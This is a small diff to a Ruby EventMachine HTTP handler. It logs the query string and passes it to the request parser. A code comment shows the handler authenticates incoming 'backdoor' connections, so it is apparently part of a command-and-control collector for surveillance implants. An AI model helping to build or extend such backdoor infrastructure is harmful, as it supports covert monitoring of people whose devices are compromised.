@@ -13,6 +13,7 @@ require 'rcs-common/trace'
 require 'rcs-common/status'
 
 # system
+require 'benchmark'
 require 'eventmachine'
 require 'evma_httpserver'
 require 'socket'
@@ -80,8 +81,8 @@ class HTTPHandler < EM::Connection
     #   @http_headers
 
     #trace :debug, "[#{@peer}] Incoming HTTP Connection"
-    trace :debug, "[#{@peer}] Request: [#{@http_request_method}] #{@http_request_uri}"
-
+    trace :debug, "[#{@peer}] Request: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string}"
+    
     resp = EM::DelegatedHttpResponse.new(self)
 
     # Block which fulfills the request
@@ -94,7 +95,7 @@ class HTTPHandler < EM::Connection
       #   - the cookie if the backdoor successfully passed the auth phase
       begin
         http_headers = @http_headers.split("\x00")
-        status, content, content_type, cookie = http_parse(@http_headers.split("\x00"), @http_request_method, @http_request_uri, @http_cookie, @http_post_content)
+        status, content, content_type, cookie = http_parse(@http_headers.split("\x00"), @http_request_method, @http_request_uri, @http_cookie, @http_post_content, @http_query_string)
       rescue Exception => e
         trace :error, "ERROR: " + e.message
         trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
@@ -123,7 +124,7 @@ class HTTPHandler < EM::Connection
 
     # Callback block to execute once the request is fulfilled
     callback = proc do |res|
-    	resp.send_response
+      resp.send_response
     end
 
     # Let the thread pool handle request
